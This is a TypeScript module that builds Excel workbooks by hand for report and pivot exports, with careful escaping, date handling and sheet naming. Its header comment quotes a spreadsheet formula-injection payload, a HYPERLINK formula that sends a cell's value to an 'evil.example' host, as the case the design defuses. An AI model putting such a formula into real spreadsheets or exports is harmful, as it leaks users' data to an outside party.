import type { PivotConfig, PivotResult, QueryResult } from '../shared/types.js';
import { zip } from './zip.js';

/**
 * Excel export — an Office Open XML workbook (ECMA-376, Transitional
 * SpreadsheetML) written by hand: a ZIP package (server/zip.ts) of a handful
 * of XML parts. No library, and nothing a spreadsheet program has to repair:
 * the parts are checked against the ECMA-376 schemas in test/xlsx.test.ts.
 *
 * What a reader gets:
 *  - numbers as numbers, text as text — strings that look like numbers stay
 *    text, because guessing changes data (a postcode "01067" is not 1067);
 *  - a column holding only ISO dates (or date-times) as real dates, shown in
 *    the reader's own date format (built-in format 14 / 22);
 *  - a bold, frozen header row with a filter, and column widths that fit.
 *
 * No cell ever carries a formula (`<f>`). A value such as
 * `=HYPERLINK("https://evil.example?"&A1)` is written as a string and stays
 * one, so the formula injection the CSV export has to defuse
 * (server/csv.ts) cannot happen here at all.
 */

const MAIN_NS = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const REL_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const PKG_REL_NS = 'http://schemas.openxmlformats.org/package/2006/relationships';
const CT_NS = 'http://schemas.openxmlformats.org/package/2006/content-types';
const XML_HEAD = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n';

/** Style indexes into cellXfs below. */
const STYLE = { plain: 0, header: 1, date: 2, datetime: 3 } as const;

/** Excel's limit for one cell's text. */
const MAX_CELL_TEXT = 32_767;

export type Cell = string | number | null;

export interface Sheet {
  name: string;
  columns: string[];
  rows: Cell[][];
  /** Bold the last row too (a totals row). */
  totalsRow?: boolean;
}

// ── XML text ─────────────────────────────────────────────────────────

/**
 * Text fit for XML 1.0: escaped, and without the control characters XML
 * cannot carry at all (a NUL in a database string would otherwise make the
 * whole file unreadable).
 */
function xmlText(value: string): string {
  return value
    // eslint-disable-next-line no-control-regex
    .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F￾￿]/g, '')
    .replace(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/g, '�')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/** A1-style column letters: 0 → A, 25 → Z, 26 → AA. */
export function columnName(index: number): string {
  let n = index + 1;
  let out = '';
  while (n > 0) {
    const r = (n - 1) % 26;
    out = String.fromCharCode(65 + r) + out;
    n = Math.floor((n - 1) / 26);
  }
  return out;
}

// ── Dates ────────────────────────────────────────────────────────────

const DATE = /^(\d{4})-(\d{2})-(\d{2})$/;
const DATETIME = /^(\d{4})-(\d{2})-(\d{2})[T ](\d{2}):(\d{2})(?::(\d{2})(?:\.\d+)?)?Z?$/;
const EXCEL_EPOCH = Date.UTC(1899, 11, 30);

/**
 * The Excel serial for an ISO date or date-time, or null when it is not one
 * Excel can show. Day 1 is 1900-01-01; with the 1899-12-30 epoch every date
 * from 1900-03-01 on is right (Excel's phantom 29 February 1900 lies before),
 * so earlier dates stay text. A trailing Z is shown as the UTC clock time —
 * a spreadsheet cell has no time zone.
 */
export function excelSerial(value: string): number | null {
  const m = DATETIME.exec(value) ?? DATE.exec(value);
  if (!m) return null;
  const [y, mo, d, h = '0', mi = '0', s = '0'] = m.slice(1);
  const ms = Date.UTC(Number(y), Number(mo) - 1, Number(d), Number(h), Number(mi), Number(s));
  const check = new Date(ms);
  // 2026-02-30 is not a date; Date.UTC would quietly roll it into March.
  if (check.getUTCFullYear() !== Number(y) || check.getUTCMonth() !== Number(mo) - 1 || check.getUTCDate() !== Number(d)) return null;
  if (ms < Date.UTC(1900, 2, 1) || Number(y) > 9999) return null;
  return (ms - EXCEL_EPOCH) / 86_400_000;
}

type ColumnKind = 'date' | 'datetime' | 'other';

/** A column is a date column only when every value in it is one. */
function kindOf(rows: readonly Cell[][], c: number): ColumnKind {
  let seen = false;
  let time = false;
  for (const row of rows) {
    const v = row[c];
    if (v === null || v === undefined) continue;
    if (typeof v !== 'string' || excelSerial(v) === null) return 'other';
    seen = true;
    if (!DATE.test(v)) time = true;
  }
  return seen ? (time ? 'datetime' : 'date') : 'other';
}

// ── Cells and sheets ─────────────────────────────────────────────────

/** A database value as a cell: numbers stay numbers, everything else is text. */
export function toCell(value: unknown): Cell {
  if (value === null || value === undefined) return null;
  if (typeof value === 'number') return Number.isFinite(value) ? value : null;
  if (typeof value === 'bigint') {
    // Beyond 2^53 Excel would round it; the digits are worth more as text.
    return value <= BigInt(Number.MAX_SAFE_INTEGER) && value >= BigInt(Number.MIN_SAFE_INTEGER) ? Number(value) : value.toString();
  }
  if (Buffer.isBuffer(value)) return `(binary, ${value.length} bytes)`;
  return String(value);
}

function cellXml(ref: string, value: Cell, kind: ColumnKind, style: number): string {
  if (value === null) return '';
  if (typeof value === 'number') return `<c r="${ref}"${style ? ` s="${style}"` : ''}><v>${value}</v></c>`;
  if (kind !== 'other') {
    const serial = excelSerial(value);
    if (serial !== null) return `<c r="${ref}" s="${kind === 'date' ? STYLE.date : STYLE.datetime}"><v>${serial}</v></c>`;
  }
  const text = xmlText(value.length > MAX_CELL_TEXT ? value.slice(0, MAX_CELL_TEXT) : value);
  const space = /^\s|\s$/.test(text) ? ' xml:space="preserve"' : '';
  return `<c r="${ref}"${style ? ` s="${style}"` : ''} t="inlineStr"><is><t${space}>${text}</t></is></c>`;
}

function displayWidth(value: Cell, kind: ColumnKind): number {
  if (value === null) return 0;
  if (kind === 'date') return 10;
  if (kind === 'datetime') return 16;
  return Math.max(...String(value).split('\n').map((line) => line.length));
}

function sheetXml(sheet: Sheet, selected: boolean): string {
  const kinds = sheet.columns.map((_, c) => kindOf(sheet.rows, c));
  const lastCol = columnName(Math.max(sheet.columns.length, 1) - 1);
  const lastRow = sheet.rows.length + 1;
  const range = `A1:${lastCol}${lastRow}`;
  const widths = sheet.columns.map((name, c) =>
    // Wide enough for the header (bold, plus the filter button) and the
    // widest value, within reason.
    Math.min(60, Math.max(8, name.length + 4, ...sheet.rows.map((r) => displayWidth(r[c] ?? null, kinds[c]!) + 2))),
  );

  const header = `<row r="1">${sheet.columns.map((name, c) => cellXml(`${columnName(c)}1`, name, 'other', STYLE.header)).join('')}</row>`;
  const body = sheet.rows
    .map((row, i) => {
      const r = i + 2;
      const style = sheet.totalsRow && i === sheet.rows.length - 1 ? STYLE.header : STYLE.plain;
      return `<row r="${r}">${sheet.columns.map((_, c) => cellXml(`${columnName(c)}${r}`, row[c] ?? null, kinds[c]!, style)).join('')}</row>`;
    })
    .join('');

  return (
    `${XML_HEAD}<worksheet xmlns="${MAIN_NS}" xmlns:r="${REL_NS}">` +
    `<dimension ref="${range}"/>` +
    `<sheetViews><sheetView${selected ? ' tabSelected="1"' : ''} workbookViewId="0">` +
    `<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>` +
    `<selection pane="bottomLeft" activeCell="A2" sqref="A2"/>` +
    `</sheetView></sheetViews>` +
    `<sheetFormatPr defaultRowHeight="15"/>` +
    `<cols>${widths.map((w, c) => `<col min="${c + 1}" max="${c + 1}" width="${w}" customWidth="1"/>`).join('')}</cols>` +
    `<sheetData>${header}${body}</sheetData>` +
    `<autoFilter ref="${sheet.totalsRow ? `A1:${lastCol}${lastRow - 1}` : range}"/>` +
    `</worksheet>`
  );
}

/** Sheet names: at most 31 characters, none of []:*?/\ and not blank. */
function sheetName(raw: string, taken: Set<string>): string {
  let name = raw.replace(/[[\]:*?/\\]/g, ' ').trim().slice(0, 31) || 'Sheet';
  for (let n = 2; taken.has(name.toLowerCase()); n++) name = `${name.slice(0, 28)} ${n}`;
  taken.add(name.toLowerCase());
  return name;
}

const STYLES =
  `${XML_HEAD}<styleSheet xmlns="${MAIN_NS}">` +
  `<fonts count="2"><font><sz val="11"/><name val="Calibri"/><family val="2"/></font><font><b/><sz val="11"/><name val="Calibri"/><family val="2"/></font></fonts>` +
  `<fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills>` +
  `<borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders>` +
  `<cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>` +
  `<cellXfs count="4">` +
  `<xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>` +
  `<xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1"/>` +
  `<xf numFmtId="14" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>` +
  `<xf numFmtId="22" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>` +
  `</cellXfs>` +
  `<cellStyles count="1"><cellStyle name="Normal" xfId="0" builtinId="0"/></cellStyles>` +
  `</styleSheet>`;

/** A workbook of one or more sheets, as the bytes of an .xlsx file. */
export function buildXlsx(sheets: readonly Sheet[]): Buffer {
  const taken = new Set<string>();
  const named = sheets.map((s) => ({ ...s, name: sheetName(s.name, taken) }));
  const quoted = (name: string) => `'${name.replace(/'/g, "''")}'`;

  const workbook =
    `${XML_HEAD}<workbook xmlns="${MAIN_NS}" xmlns:r="${REL_NS}">` +
    `<bookViews><workbookView/></bookViews>` +
    `<sheets>${named.map((s, i) => `<sheet name="${xmlText(s.name)}" sheetId="${i + 1}" r:id="rId${i + 1}"/>`).join('')}</sheets>` +
    // The filter ranges, as Excel itself records them.
    `<definedNames>${named
      .map((s, i) => {
        const last = s.rows.length + 1 - (s.totalsRow ? 1 : 0);
        return `<definedName name="_xlnm._FilterDatabase" localSheetId="${i}" hidden="1">${xmlText(quoted(s.name))}!$A$1:$${columnName(Math.max(s.columns.length, 1) - 1)}$${last}</definedName>`;
      })
      .join('')}</definedNames>` +
    `</workbook>`;

  const workbookRels =
    `${XML_HEAD}<Relationships xmlns="${PKG_REL_NS}">` +
    named.map((_, i) => `<Relationship Id="rId${i + 1}" Type="${REL_NS}/worksheet" Target="worksheets/sheet${i + 1}.xml"/>`).join('') +
    `<Relationship Id="rId${named.length + 1}" Type="${REL_NS}/styles" Target="styles.xml"/>` +
    `</Relationships>`;

  const contentTypes =
    `${XML_HEAD}<Types xmlns="${CT_NS}">` +
    `<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>` +
    `<Default Extension="xml" ContentType="application/xml"/>` +
    `<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>` +
    named.map((_, i) => `<Override PartName="/xl/worksheets/sheet${i + 1}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>`).join('') +
    `<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>` +
    `</Types>`;

  const rootRels =
    `${XML_HEAD}<Relationships xmlns="${PKG_REL_NS}">` +
    `<Relationship Id="rId1" Type="${REL_NS}/officeDocument" Target="xl/workbook.xml"/>` +
    `</Relationships>`;

  const utf8 = (s: string) => Buffer.from(s, 'utf8');
  return zip([
    { name: '[Content_Types].xml', data: utf8(contentTypes) },
    { name: '_rels/.rels', data: utf8(rootRels) },
    { name: 'xl/workbook.xml', data: utf8(workbook) },
    { name: 'xl/_rels/workbook.xml.rels', data: utf8(workbookRels) },
    { name: 'xl/styles.xml', data: utf8(STYLES) },
    ...named.map((s, i) => ({ name: `xl/worksheets/sheet${i + 1}.xml`, data: utf8(sheetXml(s, i === 0)) })),
  ]);
}

// ── Reports ──────────────────────────────────────────────────────────

/** A report result as a sheet. */
export function resultSheet(name: string, result: QueryResult): Sheet {
  return { name, columns: result.columns, rows: result.rows.map((row) => result.columns.map((c) => toCell(row[c]))) };
}

/** A pivot as a sheet: one row per row key, a totals row at the end. */
export function pivotSheet(name: string, config: PivotConfig, pivot: PivotResult): Sheet {
  const measure = config.aggregation === 'count' ? 'count' : `${config.aggregation}(${config.measure})`;
  const columns = pivot.flat ? [config.row, measure] : [config.row, ...pivot.columns, 'Total'];
  const rows: Cell[][] = pivot.rows.map((r) => (pivot.flat ? [r.key, r.values[0] ?? null] : [r.key, ...r.values, r.total]));
  rows.push(pivot.flat ? ['Total', pivot.grandTotal] : ['Total', ...pivot.columnTotals, pivot.grandTotal]);
  return { name, columns, rows, totalsRow: true };
}
